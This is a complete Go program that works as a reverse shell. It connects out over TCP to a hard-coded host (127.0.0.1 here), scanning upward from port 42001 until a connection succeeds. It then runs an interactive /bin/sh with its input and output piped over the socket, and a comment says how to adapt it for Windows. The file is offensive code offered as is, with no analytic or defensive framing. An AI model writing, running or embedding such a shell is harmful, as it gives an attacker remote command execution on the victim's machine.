package main

import (
	"fmt"
	"io"
	"net"
	"os/exec"
)

const HOST = "127.0.0.1"
const PORT = 42000

func handle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	// For Windows use exec.Command("cmd.exe").

	cmd := exec.Command("/bin/sh", "-i")

	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)

	cmd.Run()

	cmd = exec.Command("exit")
	cmd.Run()
	return
}

func main() {
	port := PORT
	address := fmt.Sprintf("%s:%d", HOST, PORT)

	port = port + 1
	address = fmt.Sprintf("%s:%d", HOST, port)
	conn, err := net.Dial("tcp", address)
	for err != nil {
		if conn != nil {
			conn.Close()
		}
		port = port + 1
		address = fmt.Sprintf("%s:%d", HOST, port)
		conn, err = net.Dial("tcp", address)
	}
	for {
		handle(conn)
	}
}
